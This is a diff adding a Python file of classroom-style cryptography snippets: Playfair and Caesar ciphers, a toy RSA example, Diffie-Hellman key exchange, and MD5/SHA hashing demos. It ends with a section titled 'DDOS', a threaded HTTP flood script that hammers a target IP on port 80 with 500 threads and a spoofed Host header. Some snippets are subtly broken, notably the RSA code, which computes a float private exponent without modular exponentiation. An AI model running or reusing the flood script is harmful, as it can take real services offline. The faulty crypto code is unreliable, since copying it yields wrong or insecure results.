@@ -1,0 +1,283 @@
+#PLAYFAIR CIPHER
+
+SIZE = 30
+def toLowerCase(plain):
+    return plain.lower()
+def removeSpaces(plain):
+    return plain.replace(" ", "")
+def generateKeyTable(key):
+    keyT = [["" for _ in range(5)] for _ in range(5)]
+    dicty = [0] * 26
+    for char in key:
+        if char != "j":
+            dicty[ord(char) - ord("a")] = 2
+    dicty[ord("j") - ord("a")] = 1
+    i, j = 0, 0
+    for char in key:
+        if dicty[ord(char) - ord("a")] == 2:
+            dicty[ord(char) - ord("a")] -= 1
+            keyT[i][j] = char
+            j += 1
+            if j == 5:
+                i += 1
+                j = 0
+    for k in range(26):
+        if dicty[k] == 0:
+            keyT[i][j] = chr(k + ord("a"))
+            j += 1
+            if j == 5:
+                i += 1
+                j = 0
+    return keyT
+def search(keyT, a, b):
+    arr = [0, 0, 0, 0]
+    for i in range(5):
+        for j in range(5):
+            if keyT[i][j] == a:
+                arr[0] = i
+                arr[1] = j
+            elif keyT[i][j] == b:
+                arr[2] = i
+                arr[3] = j
+    return arr
+def mod5(a):
+    return a % 5
+def prepare(str):
+    if len(str) % 2 != 0:
+        str += "z"
+    return str
+def encrypt(str, keyT):
+    i = 0
+    str_list = list(str)
+    while i < len(str_list):
+        a = search(keyT, str_list[i], str_list[i + 1])
+        if a[0] == a[2]:
+            str_list[i] = keyT[a[0]][mod5(a[1] + 1)]
+            str_list[i + 1] = keyT[a[0]][mod5(a[3] + 1)]
+        elif a[1] == a[3]:
+            str_list[i] = keyT[mod5(a[0] + 1)][a[1]]
+            str_list[i + 1] = keyT[mod5(a[2] + 1)][a[1]]
+        else:
+            str_list[i] = keyT[a[0]][a[3]]
+            str_list[i + 1] = keyT[a[2]][a[1]]
+        i += 2
+    return "".join(str_list)
+def encryptByPlayfairCipher(str, key):
+    key = key.lower()
+    key = removeSpaces(key)
+    keyT = generateKeyTable(key)
+    str = str.lower()
+    str = removeSpaces(str)
+    str = prepare(str)
+    str = encrypt(str, keyT)
+    return str
+if __name__ == "__main__":
+    key = "Algorithm"
+    print("Key text:", key)
+    str = "Programming"
+    print("Plain text:", str)
+    encrypted_str = encryptByPlayfairCipher(str, key)
+    print("Cipher text:", encrypted_str)
+
+
+
+#CESAR CIPHER
+def main():
+    text = input("Enter a message to decrypt: ")
+    key = int(input("Enter the key: "))
+    decrypted_text = ""
+    for char in text:
+        if char.isalpha():
+            if char.islower():
+                decrypted_char = chr(
+                    ((ord(char) - ord("a") - key + 26) % 26) + ord("a")
+                )
+            elif char.isupper():
+                decrypted_char = chr(
+                    ((ord(char) - ord("A") - key + 26) % 26) + ord("A")
+                )
+        elif char.isdigit():
+            decrypted_char = chr(((ord(char) - ord("0") - key + 10) % 10) + ord("0"))
+        else:
+            print("Invalid Message")
+            return
+        decrypted_text += decrypted_char
+    print(f"Decrypted message: {decrypted_text}")
+if __name__ == "__main__":
+    main()
+
+
+
+#RSA
+import math
+def gcd(a, h):
+    while True:
+        temp = a % h
+        if temp == 0:
+            return h
+        a, h = h, temp
+p = 3
+q = 7
+n = p * q
+count = 0
+totient = (p - 1) * (q - 1)
+e = 2
+while e < totient:
+    count = gcd(e, totient)
+    if count == 1:
+        break
+    else:
+        e += 1
+d = None
+k = 2  
+d = (1 + (k * totient)) / e
+msg = 12
+c = pow(msg, e)
+m = pow(c, d)
+c = c % n
+m = m % n
+print("Message data =", msg)
+print("p =", p)
+print("q =", q)
+print("n = pq =", n)
+print("totient =", totient)
+print("e =", e)
+print("d =", d)
+print("Encrypted data =", c)
+print("Original Message Sent =", m)
+
+
+
+
+#1 Deffie Hamilton
+def compute(a, m, n):
+    r = 0
+    y = 1
+    while m > 0:
+        r = m % 2
+        if r == 1:
+            y = (y * a) % n
+        a = (a * a) % n
+        m = m // 2
+    return y
+
+# Main program
+p = 23  
+g = 5   
+a, b = 0, 0  # `a` – Alice's secret key, `b` – Bob's secret key
+A, B = 0, 0  # `A` – Alice's public key, `B` – Bob's public key
+a = 6 
+A = compute(g, a, p)
+b = 15  
+B = compute(g, b, p)
+keyA = compute(B, a, p)
+keyB = compute(A, b, p)
+
+print(f"Alice's secret key is {keyA}")
+print(f"Bob's secret key is {keyB}")
+
+
+
+
+#Encode a string in MD5 using Python
+
+import hashlib
+string = "pythonpool"
+encoded = string.encode()
+result = hashlib.md5(encoded)
+print("String: ", end="")
+print(string)
+print("Hash Value:", end=" ")
+print(result)
+print("Hexadecimal equivalent:", result.hexdigest())
+
+
+
+
+
+#Calculating MD5 hash of a file in Python
+
+ # STEP 1: Create  a sample File Sample.txt
+
+import hashlib
+
+with open("sample.txt", "rb") as f:
+    bytes = f.read()
+    print("Bytes read from the file:", bytes)
+    result = hashlib.md5(bytes)
+    print("Hash Value:", result)
+    print("The hexadecimal equivalent:", result.hexdigest())
+
+
+
+
+#SHA CODE
+
+import hashlib
+str = "GeeksforGeeks"
+result = hashlib.sha256(str.encode())
+print("The hexadecimal equivalent of SHA256 is :")
+print(result.hexdigest())
+print("\r")
+str = "GeeksforGeeks"
+result = hashlib.sha384(str.encode())
+print("The hexadecimal equivalent of SHA384 is :")
+print(result.hexdigest())
+print("\r")
+str = "GeeksforGeeks"
+result = hashlib.sha224(str.encode())
+print("The hexadecimal equivalent of SHA224 is :")
+print(result.hexdigest())
+print("\r")
+str = "GeeksforGeeks"
+result = hashlib.sha512(str.encode())
+print("The hexadecimal equivalent of SHA512 is :")
+print(result.hexdigest())
+print("\r")
+str = "GeeksforGeeks"
+result = hashlib.sha1(str.encode())
+print("The hexadecimal equivalent of SHA1 is :")
+print(result.hexdigest())
+
+
+
+
+
+#DDOS
+
+import socket
+import threading
+
+target = '10.0.0.138'
+fake_ip = '182.21.20.32'
+port = 80
+
+def attack():
+  while True:
+   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   s.connect((target, port))
+   s.sendto(("GET /"+ target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
+   s.sendto(("Host:"+ fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+   s.close()
+
+for i in range(500):
+ thread = threading.Thread(target=attack)
+ thread.start()
+
+attack_num = 0
+def attack():
+ while True:
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((target, port))
+  s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+  s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+  global attack_num
+  attack_num += 1
+  print(attack_num)
+  s.close()
+
+
+
+
+
+
